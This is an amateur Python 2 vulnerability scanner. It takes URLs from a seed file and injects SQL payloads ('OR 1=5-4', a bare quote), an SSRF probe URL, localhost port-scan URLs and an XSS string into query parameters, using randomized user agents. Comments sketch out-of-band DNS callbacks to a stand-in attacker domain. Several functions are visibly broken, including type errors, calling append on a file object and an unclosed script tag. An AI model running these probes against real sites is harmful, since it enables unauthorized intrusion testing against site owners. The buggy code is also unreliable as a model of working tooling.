# my own shitty sqli injection tool Blind as Well as Error Based plus a new SSRF detection addon
# what I'm trying is to find inputs that allow requests to a file which could allow us to attempt ssrf aka server side request forgery
from urlparse import parse_qs, urlparse, urlsplit
from urllib import urlencode
import requests
import os
import sys
import mechanize
from collections import OrderedDict
import urllib2
import binascii
from random import choice
import urllib



class Customer_Vuln_Scanner(object):

    """A customer  with an Active Account. Customers have the
        following properties:

        Attributes:
            name: A string representing the customer's name.
            active: A Bool tracking the current status of the customer's account.
        """

    def __init__(self, name, domain, active=True):
        """Return a Customer object whose name is *name* and starting
        status is *active*.
        domain is there asset """
        self.name = name
        self.active = active
        self.domain = domain
        self.basic_xss = "<script>alert(ass)<script>"
        # possible user input sinks or things grabbing files possibly allowing ssrf? not sure but sure am trying to learn this
        self.ssrf_test_list = ["http://", "https://", "ftp://", ".jpg", ".png", ".gif", ".pdf", ".doc", ".docx", ".ppt", ".pptx",
                  ".docm", ".html", ".jsp", ".asp", ".aspx", ".csv", ".xml"]
        self.possible_ssrf_sinks = []
        self.scrape_post_urls = []
        self.get_inj_tests = []
        self.basic_sql = "'"
        self.b_unescaped_true = "OR 1=5-4"
        self.b_escaped_true = "'OR 1=5-4"
        self.ssrf_test = "http://0.0.0.0:8001/testssrf.jpg"
        self.poss_blind_sqlis = []
        self.poss_error_based_sqlis = []
        # https://github.com/0xhex/google-dork-scanner/blob/master/scanner.py borrowed this and modded it to use a list more efficient added more errors
        self.sql_errors = ["sql", "SQL", "MySQL", "MYSQL", "MSSQL", "unclosed quotation mark", "syntax error", "adodb", "recordset"]
        self.desktop_agents = [
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14',
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.98 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.98 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0']

    def blind_ssrf_tester(self,host_hash, target_param):
       # here we use generated hash per host and check whether it can be resolved via our nameserver
       # https://www.netsparker.com/blog/docs-and-faqs/netsparker-hawk-detects-ssrf-out-of-band-vulnerabilities/
       print "test"


    def internal_ssrf__port_scanner(self):
       # feed back 100 urls in list to test against each individual sink mock ssrf port scan
       draino = []
       for i in range(1, 100):
           sink_cleaner = 'http://127.0.0.1:' + int(i)
           draino.append(sink_cleaner)
       return draino


    def parse_url(self,url):
        parsed = urlparse(url, allow_fragments=False)

        if parsed.query:

           if url not in self.get_inj_tests:
              self.get_inj_tests.append(url)


           else:
               # ?
               if url not in self.scrape_post_urls:
                  self.scrape_post_urls.append(url)





    def random_headers(self):
        return {'User-Agent': choice(self.desktop_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}




    def blind_tests(self,url_in, test, stable_response):
        blind_error = ""
        req = requests.get(url_in, timeout=3, verify=False, headers=self.random_headers())
        req.encoding  # returns 'utf-8'
        req.status_code  # returns 200
        req.elapsed  # returns datetime.timedelta(0, 1, 666890)
        req.url  # returns url_in
        req.history
        # returns [<Response [301]>, <Response [301]>]
        req.headers['Content-Type']

        return req.status_code, req.text






    def requester_get(self,url_in):
        req = requests.get(url_in, timeout=3, verify=False, headers=self.random_headers())
        req.encoding  # returns 'utf-8'
        req.status_code  # returns 200
        req.elapsed  # returns datetime.timedelta(0, 1, 666890)
        req.url  # returns url_in
        req.history
        # returns [<Response [301]>, <Response [301]>]
        req.headers['Content-Type']
        return req.status_code, req.encoding, req.text





def main():
    Vuln_Scanner = Customer_Vuln_Scanner("test",sys.argv[1])
    unparsed_urls = open('seeds.txt', 'r')
    for urls in unparsed_urls:
        try:
            Vuln_Scanner.parse_url(urls)
            # url_discovery(urls,"20")
        except:
            pass
    print("Detected:" + str(len(Vuln_Scanner.get_inj_tests)))
    # spider for additional hosts

    # vuln scanner portion
    clean_list = list(OrderedDict.fromkeys(Vuln_Scanner.get_inj_tests))
    reaasembled_url = ""
    results_crawled = ""
    for query_test in clean_list:
        output = open("outputssrfsinks.txt", "a")
        output_sqli = open("output_sqli_found.txt", "a")
        url_clean = urllib.unquote(query_test).decode('utf8')
        print(url_clean)
        url_object = urlparse(url_clean, allow_fragments=False)
        # parse query paramaters
        url_query = query_test.split("?")[1].strip()
        # https://stackoverflow.com/questions/50058154/parsing-query-parameters-in-python
        try:
            dicty = {x[0]: x[1] for x in [x.split("=") for x in url_query.split("&")]}
            query_pairs = [(k, v) for k, vlist in dicty.iteritems() for v in vlist]
            reaasembled_url = "http://" + str(url_object.netloc) + str(url_object.path) + '?'
            # use host hash to implement blind ssrf test to resolve from a nameserver for domain
            # if our domain is sssrfevil.net we set up a mock dns server log requests and search for request
            # host_hash.sssrfevil.net trying to resolve against the name server but with a twist append variable tested to domain
            # "param_header"+param+"_"+host_hash.sssrfevil.net so we parse at the backend from header to trailing _
            host_hash = binascii.hexlify(os.urandom(16))
            temp_sqli_query = {}
            # here we will manipulate the url paramters and create a basic vuln scanner
            for k, v in dicty.iteritems():
                print(urllib.unquote(v).decode('utf8'))
                # test for possible ssrf sinks
                for item in Vuln_Scanner.ssrf_test_list:
                    if item in v:
                        print("-" * 20)
                        print("Possible SSRF Sink Found")
                        print("-" * 20)
                        print(urllib.unquote(v).decode('utf8'))
                        possible_hit = {'Url': url_clean, 'Possible_sink': k, "Value": urllib.unquote(v).decode('utf8')}
                        Vuln_Scanner.possible_ssrf_sinks.append(possible_hit)
                        print("-" * 20)
                        output.write(str(possible_hit) + "\n")
                #if k: v contains a match for ssrf vector this is true use this parameter
                #entry_data_local = {k: v + Vuln_Scanner.ssrf_test}
                entry_data_local = {k: v + Vuln_Scanner.ssrf_test}
                # blind sqli tests
                local_blind_true_unescaped = {k: v + "" + Vuln_Scanner.b_unescaped_true}
                local_blind_true_escaped = {k: v + "" + Vuln_Scanner.b_escaped_true}
                temp_sqli_query.update(entry_data_local)
            reaasembled_query = urlencode(temp_sqli_query)
            full_url = reaasembled_url + reaasembled_query
            print(full_url)
            # now we call the sql injection test
            try:
                status, encoding, text = Vuln_Scanner.requester_get(full_url)
                print(status, encoding, text)
                # check for sql injection results
                if text:
                    for possible_errors in Vuln_Scanner.sql_errors:
                        if possible_errors in text:
                            local_sqli_object = {"Host": full_url, "Error_Detected": str(text)}
                            print("Possible Sql Injection Detected: "+ local_sqli_object)
                            output_sqli.append(local_sqli_object)
                            Vuln_Scanner.poss_error_based_sqlis.append(local_sqli_object)

            except:
                pass

            for sinks in Vuln_Scanner.possible_ssrf_sinks:
                print(str(sinks))
                try:
                    # each individual paramter is tested against a local port scan to see if its vulnerable
                    port_prepper = Vuln_Scanner.internal_ssrf__port_scanner()
                    # now for each paramter iterate over these analyze response and see if its vuln
                    # you need a baseline response first from the page to test for errors
                except:
                    pass

        except:
            pass

        output.close()
        output_sqli.close()
        for detected_injections in Vuln_Scanner.poss_error_based_sqlis:
            print(detected_injections)


main()
